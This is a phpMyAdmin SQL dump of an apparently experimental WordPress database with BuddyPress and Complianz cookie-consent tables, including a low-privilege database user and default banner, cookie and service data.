-- phpMyAdmin SQL Dump
-- version 5.2.0
-- https://www.phpmyadmin.net/
--
-- Host: exp-2-db
-- Generation Time: Oct 29, 2022 at 01:55 PM
-- Server version: 10.6.10-MariaDB
-- PHP Version: 8.0.24

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `wordpress-exp-2-2`
--
CREATE DATABASE IF NOT EXISTS `wordpress-exp-2-2` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;
USE `wordpress-exp-2-2`;

/* CREATE LOW PRIV USER FOR WORDPRESS V2!! */
CREATE USER 'wp_lowpriv_exp2'@'%' IDENTIFIED VIA mysql_native_password USING '*B2AD9BDB8EAEC73CF81C76E98740520507D2181A';GRANT USAGE ON *.* TO 'wp_lowpriv_exp2'@'%' REQUIRE NONE WITH MAX_QUERIES_PER_HOUR 0 MAX_CONNECTIONS_PER_HOUR 0 MAX_UPDATES_PER_HOUR 0 MAX_USER_CONNECTIONS 0;
GRANT SELECT, INSERT, UPDATE, DELETE ON `wordpress-exp-2-2`.* TO 'wp_lowpriv_exp2'@'%';
FLUSH PRIVILEGES;

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_activity`
--

CREATE TABLE `wp_bp_activity` (
  `id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `component` varchar(75) COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` varchar(75) COLLATE utf8mb4_unicode_ci NOT NULL,
  `action` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `primary_link` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `item_id` bigint(20) NOT NULL,
  `secondary_item_id` bigint(20) DEFAULT NULL,
  `date_recorded` datetime NOT NULL,
  `hide_sitewide` tinyint(1) DEFAULT 0,
  `mptt_left` int(11) NOT NULL DEFAULT 0,
  `mptt_right` int(11) NOT NULL DEFAULT 0,
  `is_spam` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_activity_meta`
--

CREATE TABLE `wp_bp_activity_meta` (
  `id` bigint(20) NOT NULL,
  `activity_id` bigint(20) NOT NULL,
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_invitations`
--

CREATE TABLE `wp_bp_invitations` (
  `id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `inviter_id` bigint(20) NOT NULL,
  `invitee_email` varchar(100) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `class` varchar(120) COLLATE utf8mb4_unicode_ci NOT NULL,
  `item_id` bigint(20) NOT NULL,
  `secondary_item_id` bigint(20) DEFAULT NULL,
  `type` varchar(12) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'invite',
  `content` longtext COLLATE utf8mb4_unicode_ci DEFAULT '',
  `date_modified` datetime NOT NULL,
  `invite_sent` tinyint(1) NOT NULL DEFAULT 0,
  `accepted` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_notifications`
--

CREATE TABLE `wp_bp_notifications` (
  `id` bigint(20) NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `item_id` bigint(20) NOT NULL,
  `secondary_item_id` bigint(20) DEFAULT NULL,
  `component_name` varchar(75) COLLATE utf8mb4_unicode_ci NOT NULL,
  `component_action` varchar(75) COLLATE utf8mb4_unicode_ci NOT NULL,
  `date_notified` datetime NOT NULL,
  `is_new` tinyint(1) NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_notifications_meta`
--

CREATE TABLE `wp_bp_notifications_meta` (
  `id` bigint(20) NOT NULL,
  `notification_id` bigint(20) NOT NULL,
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_optouts`
--

CREATE TABLE `wp_bp_optouts` (
  `id` bigint(20) NOT NULL,
  `email_address_hash` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` bigint(20) NOT NULL,
  `email_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `date_modified` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_xprofile_data`
--

CREATE TABLE `wp_bp_xprofile_data` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `field_id` bigint(20) UNSIGNED NOT NULL,
  `user_id` bigint(20) UNSIGNED NOT NULL,
  `value` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_updated` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_xprofile_fields`
--

CREATE TABLE `wp_bp_xprofile_fields` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `group_id` bigint(20) UNSIGNED NOT NULL,
  `parent_id` bigint(20) UNSIGNED NOT NULL,
  `type` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `is_required` tinyint(1) NOT NULL DEFAULT 0,
  `is_default_option` tinyint(1) NOT NULL DEFAULT 0,
  `field_order` bigint(20) NOT NULL DEFAULT 0,
  `option_order` bigint(20) NOT NULL DEFAULT 0,
  `order_by` varchar(15) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `can_delete` tinyint(1) NOT NULL DEFAULT 1
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_bp_xprofile_fields`
--

INSERT INTO `wp_bp_xprofile_fields` (`id`, `group_id`, `parent_id`, `type`, `name`, `description`, `is_required`, `is_default_option`, `field_order`, `option_order`, `order_by`, `can_delete`) VALUES
(1, 1, 0, 'textbox', 'Name', '', 1, 0, 0, 0, '', 0);

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_xprofile_groups`
--

CREATE TABLE `wp_bp_xprofile_groups` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` mediumtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `group_order` bigint(20) NOT NULL DEFAULT 0,
  `can_delete` tinyint(1) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_bp_xprofile_groups`
--

INSERT INTO `wp_bp_xprofile_groups` (`id`, `name`, `description`, `group_order`, `can_delete`) VALUES
(1, 'Base', '', 0, 0);

-- --------------------------------------------------------

--
-- Table structure for table `wp_bp_xprofile_meta`
--

CREATE TABLE `wp_bp_xprofile_meta` (
  `id` bigint(20) NOT NULL,
  `object_id` bigint(20) NOT NULL,
  `object_type` varchar(150) COLLATE utf8mb4_unicode_ci NOT NULL,
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_bp_xprofile_meta`
--

INSERT INTO `wp_bp_xprofile_meta` (`id`, `object_id`, `object_type`, `meta_key`, `meta_value`) VALUES
(1, 1, 'field', 'allow_custom_visibility', 'disabled'),
(2, 1, 'field', 'signup_position', '1');

-- --------------------------------------------------------

--
-- Table structure for table `wp_cmplz_cookiebanners`
--

CREATE TABLE `wp_cmplz_cookiebanners` (
  `ID` int(11) NOT NULL,
  `banner_version` int(11) NOT NULL,
  `default` int(11) NOT NULL,
  `archived` int(11) NOT NULL,
  `title` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `position` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `theme` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `checkbox_style` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `use_logo` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `logo_attachment_id` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `close_button` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `revoke` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `manage_consent_options` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `header` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `dismiss` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `save_preferences` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `view_preferences` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_functional` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_all` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_stats` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `category_prefs` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `accept` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `message_optin` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `use_categories` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `disable_cookiebanner` int(11) NOT NULL,
  `banner_width` int(11) NOT NULL,
  `soft_cookiewall` int(11) NOT NULL,
  `dismiss_on_scroll` int(11) NOT NULL,
  `dismiss_on_timeout` int(11) NOT NULL,
  `dismiss_timeout` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `accept_informational` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `message_optout` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `use_custom_cookie_css` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `custom_css` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `statistics` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `functional_text` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `statistics_text` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `statistics_text_anonymous` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `preferences_text` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `marketing_text` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `colorpalette_background` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `colorpalette_text` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `colorpalette_toggles` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `colorpalette_border_radius` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `border_width` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `font_size` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `colorpalette_button_accept` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `colorpalette_button_deny` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `colorpalette_button_settings` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `buttons_border_radius` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `animation` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `use_box_shadow` int(11) NOT NULL,
  `header_footer_shadow` int(11) NOT NULL,
  `hide_preview` int(11) NOT NULL,
  `disable_width_correction` int(11) NOT NULL,
  `legal_documents` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_cmplz_cookiebanners`
--

INSERT INTO `wp_cmplz_cookiebanners` (`ID`, `banner_version`, `default`, `archived`, `title`, `position`, `theme`, `checkbox_style`, `use_logo`, `logo_attachment_id`, `close_button`, `revoke`, `manage_consent_options`, `header`, `dismiss`, `save_preferences`, `view_preferences`, `category_functional`, `category_all`, `category_stats`, `category_prefs`, `accept`, `message_optin`, `use_categories`, `disable_cookiebanner`, `banner_width`, `soft_cookiewall`, `dismiss_on_scroll`, `dismiss_on_timeout`, `dismiss_timeout`, `accept_informational`, `message_optout`, `use_custom_cookie_css`, `custom_css`, `statistics`, `functional_text`, `statistics_text`, `statistics_text_anonymous`, `preferences_text`, `marketing_text`, `colorpalette_background`, `colorpalette_text`, `colorpalette_toggles`, `colorpalette_border_radius`, `border_width`, `font_size`, `colorpalette_button_accept`, `colorpalette_button_deny`, `colorpalette_button_settings`, `buttons_border_radius`, `animation`, `use_box_shadow`, `header_footer_shadow`, `hide_preview`, `disable_width_correction`, `legal_documents`) VALUES
(1, 9, 1, 0, 'bottom-right view-preferences', 'bottom-right', '', 'slider', 'hide', '0', '1', 'Manage consent', 'hover-hide-mobile', 'a:2:{s:4:\"text\";s:21:\"Manage Cookie Consent\";s:4:\"show\";i:1;}', 'a:2:{s:4:\"text\";s:4:\"Deny\";s:4:\"show\";i:1;}', 'Save preferences', 'View preferences', 'Functional', 'a:2:{s:4:\"text\";s:9:\"Marketing\";s:4:\"show\";i:1;}', 'a:2:{s:4:\"text\";s:10:\"Statistics\";s:4:\"show\";i:1;}', 'a:2:{s:4:\"text\";s:11:\"Preferences\";s:4:\"show\";i:1;}', 'Accept', 'To provide the best experiences, we use technologies like cookies to store and/or access device information. Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. Not consenting or withdrawing consent, may adversely affect certain features and functions.', 'view-preferences', 0, 526, 0, 0, 0, '10', 'a:2:{s:4:\"text\";s:6:\"Accept\";s:4:\"show\";i:1;}', 'To provide the best experiences, we use technologies like cookies to store and/or access device information. Consenting to these technologies will allow us to process data such as browsing behavior or unique IDs on this site. Not consenting or withdrawing consent, may adversely affect certain features and functions.', '0', '/* Container */\n.cmplz-cookiebanner{}\n\n/* Logo */\n.cmplz-cookiebanner .cmplz-logo{}\n/* Title */\n.cmplz-cookiebanner .cmplz-title{}\n/* Close icon */\n.cmplz-cookiebanner .cmplz-close{}\n\n/* Message */\n.cmplz-cookiebanner .cmplz-message{}\n\n /* All buttons */\n.cmplz-buttons .cmplz-btn{}\n/* Accept button */\n.cmplz-btn .cmplz-accept{} \n /* Deny button */\n.cmplz-btn .cmplz-deny{}\n /* Save preferences button */\n.cmplz-btn .cmplz-deny{}\n /* View preferences button */\n.cmplz-btn .cmplz-deny{}\n\n /* Document hyperlinks */\n.cmplz-links .cmplz-documents{}\n\n /* Categories */\n.cmplz-cookiebanner .cmplz-category{}\n.cmplz-cookiebanner .cmplz-category-title{} \n\n/* Manage consent tab */\n#cmplz-manage-consent .cmplz-manage-consent{} \n\n/* Soft cookie wall */\n.cmplz-soft-cookiewall{}\n\n/* Placeholder button - Per category */\n.cmplz-blocked-content-container .cmplz-blocked-content-notice{}\n\n/* Placeholder button & message - Per service */\n.cmplz-blocked-content-container .cmplz-blocked-content-notice,\n.cmplz-blocked-content-notice{}\nbutton.cmplz-accept-service{}\n\n/* Styles for the AMP notice */\n#cmplz-consent-ui, #cmplz-post-consent-ui {}\n/* Message */\n#cmplz-consent-ui .cmplz-consent-message {}\n/* Buttons */\n#cmplz-consent-ui button, #cmplz-post-consent-ui button {}', 'a:0:{}', 'a:2:{s:4:\"text\";s:289:\"The technical storage or access is strictly necessary for the legitimate purpose of enabling the use of a specific service explicitly requested by the subscriber or user, or for the sole purpose of carrying out the transmission of a communication over an electronic communications network.\";s:4:\"show\";i:1;}', 'a:2:{s:4:\"text\";s:82:\"The technical storage or access that is used exclusively for statistical purposes.\";s:4:\"show\";i:1;}', 'a:2:{s:4:\"text\";s:317:\"The technical storage or access that is used exclusively for anonymous statistical purposes. Without a subpoena, voluntary compliance on the part of your Internet Service Provider, or additional records from a third party, information stored or retrieved for this purpose alone cannot usually be used to identify you.\";s:4:\"show\";i:1;}', 'a:2:{s:4:\"text\";s:144:\"The technical storage or access is necessary for the legitimate purpose of storing preferences that are not requested by the subscriber or user.\";s:4:\"show\";i:1;}', 'a:2:{s:4:\"text\";s:181:\"The technical storage or access is required to create user profiles to send advertising, or to track the user on a website or across several websites for similar marketing purposes.\";s:4:\"show\";i:1;}', 'a:2:{s:5:\"color\";s:7:\"#ffffff\";s:6:\"border\";s:7:\"#f2f2f2\";}', 'a:2:{s:5:\"color\";s:7:\"#222222\";s:9:\"hyperlink\";s:7:\"#1E73BE\";}', 'a:3:{s:10:\"background\";s:7:\"#1e73be\";s:6:\"bullet\";s:7:\"#ffffff\";s:8:\"inactive\";s:7:\"#F56E28\";}', 'a:5:{s:3:\"top\";i:12;s:5:\"right\";i:12;s:6:\"bottom\";i:12;s:4:\"left\";i:12;s:4:\"type\";s:2:\"px\";}', 'a:4:{s:3:\"top\";i:0;s:5:\"right\";i:0;s:6:\"bottom\";i:0;s:4:\"left\";i:0;}', '12', 'a:3:{s:10:\"background\";s:7:\"#1E73BE\";s:6:\"border\";s:7:\"#1E73BE\";s:4:\"text\";s:7:\"#ffffff\";}', 'a:3:{s:10:\"background\";s:7:\"#f9f9f9\";s:6:\"border\";s:7:\"#f2f2f2\";s:4:\"text\";s:7:\"#222222\";}', 'a:3:{s:10:\"background\";s:7:\"#f9f9f9\";s:6:\"border\";s:7:\"#f2f2f2\";s:4:\"text\";s:7:\"#333333\";}', 'a:5:{s:3:\"top\";i:6;s:5:\"right\";i:6;s:6:\"bottom\";i:6;s:4:\"left\";i:6;s:4:\"type\";s:2:\"px\";}', 'none', 1, 0, 0, 0, 1);

-- --------------------------------------------------------

--
-- Table structure for table `wp_cmplz_cookies`
--

CREATE TABLE `wp_cmplz_cookies` (
  `ID` int(11) NOT NULL,
  `name` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL,
  `sync` int(11) NOT NULL,
  `ignored` int(11) NOT NULL,
  `retention` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `type` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `serviceID` int(11) NOT NULL,
  `cookieFunction` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `collectedPersonalData` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `purpose` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `language` varchar(6) COLLATE utf8mb4_unicode_ci NOT NULL,
  `isTranslationFrom` int(11) NOT NULL,
  `isPersonalData` int(11) NOT NULL,
  `isOwnDomainCookie` int(11) NOT NULL,
  `deleted` int(11) NOT NULL,
  `isMembersOnly` int(11) NOT NULL,
  `showOnPolicy` int(11) NOT NULL,
  `lastUpdatedDate` int(11) NOT NULL,
  `lastAddDate` int(11) NOT NULL,
  `firstAddDate` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_cmplz_cookies`
--

INSERT INTO `wp_cmplz_cookies` (`ID`, `name`, `slug`, `sync`, `ignored`, `retention`, `type`, `serviceID`, `cookieFunction`, `collectedPersonalData`, `purpose`, `language`, `isTranslationFrom`, `isPersonalData`, `isOwnDomainCookie`, `deleted`, `isMembersOnly`, `showOnPolicy`, `lastUpdatedDate`, `lastAddDate`, `firstAddDate`) VALUES
(1, 'Console/Mode', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(2, 'auto_saved_sql', 'auto_saved_sql', 1, 1, 'persistent', '', 1, '', '', 'Functional', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(3, 'phpdebugbar-open', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(4, 'Console', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(5, 'DataTables_commish-table_/home', '', 1, 1, '', '', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(6, 'DRIFT_visitCounts', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(7, 'DRIFT_isChatFrameOpen', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(8, 'phpdebugbar-tab', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(9, 'DataTables_payments_/admin', '', 1, 1, '', '', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(10, 'favorite_tables', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(11, 'DataTables_trans-table_/home', '', 1, 1, '', '', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(12, 'phpdebugbar-height', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(13, 'DataTables_tips-table_/home', '', 1, 1, '', '', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(14, 'DataTables_contact-latest_/admin', '', 1, 1, '', '', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(15, 'DataTables_pending-payouts_/admin', '', 1, 1, '', '', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(16, 'DataTables_commish-overdue_/admin', '', 1, 1, '', '', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(17, 'NavigationWidth', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(18, '__paypal_storage__', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(19, 'phpdebugbar-visible', '', 1, 0, '', 'localstorage', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(20, '_grecaptcha', '_grecaptcha', 1, 0, 'session', 'Cookie', 2, 'provide spam protection', 'browsing device information', 'Functional', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(21, 'WP_DATA_USER_1', 'wp_data_user_1', 1, 1, 'various', 'Cookie', 3, 'provide admin functions', '', 'Functional', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(22, 'drift_aid', '', 1, 0, '', 'cookie', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(23, 'driftt_aid', 'driftt_aid', 1, 0, '2 years', '', 4, 'store a unique user ID', 'user ID', 'Marketing/Tracking', 'en', 0, 1, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(24, '_ga', '_ga', 1, 0, '2 years', 'Cookie', 5, 'store and count pageviews', '', 'Statistics', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(25, 'wordpress_test_cookie', 'wordpress_test_cookie', 1, 0, 'session', 'Cookie', 3, 'read if cookies can be placed', '', 'Functional', 'en', 0, 0, 1, 0, 1, 1, 1666514040, 1666513889, 1666513886),
(26, 'wp_lang', 'wp_lang', 1, 0, 'session', 'Cookie', 3, 'store language settings', '', 'Functional', 'en', 0, 0, 1, 0, 1, 1, 1666514040, 1666513889, 1666513886),
(27, 'wp-settings-time-*', 'wp-settings-time', 1, 1, '1 year', '', 3, 'store user preferences', '', 'Functional', 'en', 0, 0, 1, 0, 1, 1, 1666514040, 1666513889, 1666513886),
(28, 'remember_*', 'remember_', 1, 0, '', '', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 1666514040, 1666513889, 1666513886),
(29, '_motor_admin_session', '', 1, 0, '', 'cookie', 0, '', '', '', 'en', 0, 0, 1, 0, 0, 1, 0, 1666513889, 1666513886),
(30, 'wordpress_logged_in_*', 'wordpress_logged_in_', 1, 0, 'persistent', '', 3, 'Store logged in users', '', 'Functional', 'en', 0, 0, 1, 0, 1, 1, 1666514040, 1666513889, 1666513886),
(31, 'rc::c', 'rcc', 1, 0, 'session', '', 2, 'read and filter requests from bots', '', 'Marketing/Tracking', 'en', 0, 0, 0, 0, 0, 1, 1666514043, 1666514041, 1666514041),
(32, 'rc::b', 'rcb', 1, 0, 'session', '', 2, 'read and filter requests from bots', '', 'Marketing/Tracking', 'en', 0, 0, 0, 0, 0, 1, 1666514043, 1666514041, 1666514041),
(33, 'rc::a', 'rca', 1, 0, 'persistent', '', 2, 'read and filter requests from bots', '', 'Marketing/Tracking', 'en', 0, 0, 0, 0, 0, 1, 1666514043, 1666514041, 1666514041);

-- --------------------------------------------------------

--
-- Table structure for table `wp_cmplz_services`
--

CREATE TABLE `wp_cmplz_services` (
  `ID` int(11) NOT NULL,
  `name` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL,
  `slug` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL,
  `serviceType` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL,
  `category` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL,
  `thirdParty` int(11) NOT NULL,
  `sharesData` int(11) NOT NULL,
  `secondParty` int(11) NOT NULL,
  `privacyStatementURL` varchar(250) COLLATE utf8mb4_unicode_ci NOT NULL,
  `language` varchar(6) COLLATE utf8mb4_unicode_ci NOT NULL,
  `isTranslationFrom` int(11) NOT NULL,
  `sync` int(11) NOT NULL,
  `lastUpdatedDate` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_cmplz_services`
--

INSERT INTO `wp_cmplz_services` (`ID`, `name`, `slug`, `serviceType`, `category`, `thirdParty`, `sharesData`, `secondParty`, `privacyStatementURL`, `language`, `isTranslationFrom`, `sync`, `lastUpdatedDate`) VALUES
(1, 'phpMyAdmin', 'phpmyadmin', 'website development', '', 0, 0, 0, '', 'en', 0, 1, 1666514041),
(2, 'Google reCAPTCHA', 'google-recaptcha', 'spam prevention', '', 1, 1, 0, 'https://policies.google.com/privacy', 'en', 0, 1, 1666514041),
(3, 'WordPress', 'wordpress', 'website development', '', 0, 0, 0, '', 'en', 0, 1, 1666514041),
(4, 'Drift', 'drift', 'customer identity management', '', 1, 1, 1, 'https://gethelp.drift.com/hc/en-us/articles/360019665133-What-is-Drift-s-Cookie-Security-and-Privacy-Policy-', 'en', 0, 1, 1666514041),
(5, 'Google Analytics', 'google-analytics', 'website statistics', '', 1, 1, 1, 'https://policies.google.com/privacy', 'en', 0, 1, 1666514041);

-- --------------------------------------------------------

--
-- Table structure for table `wp_commentmeta`
--

CREATE TABLE `wp_commentmeta` (
  `meta_id` bigint(20) UNSIGNED NOT NULL,
  `comment_id` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `wp_comments`
--

CREATE TABLE `wp_comments` (
  `comment_ID` bigint(20) UNSIGNED NOT NULL,
  `comment_post_ID` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `comment_author` tinytext COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment_author_email` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_author_url` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_author_IP` varchar(100) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_date_gmt` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `comment_content` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `comment_karma` int(11) NOT NULL DEFAULT 0,
  `comment_approved` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '1',
  `comment_agent` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `comment_type` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT 'comment',
  `comment_parent` bigint(20) UNSIGNED NOT NULL DEFAULT 0,
  `user_id` bigint(20) UNSIGNED NOT NULL DEFAULT 0
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `wp_comments`
--

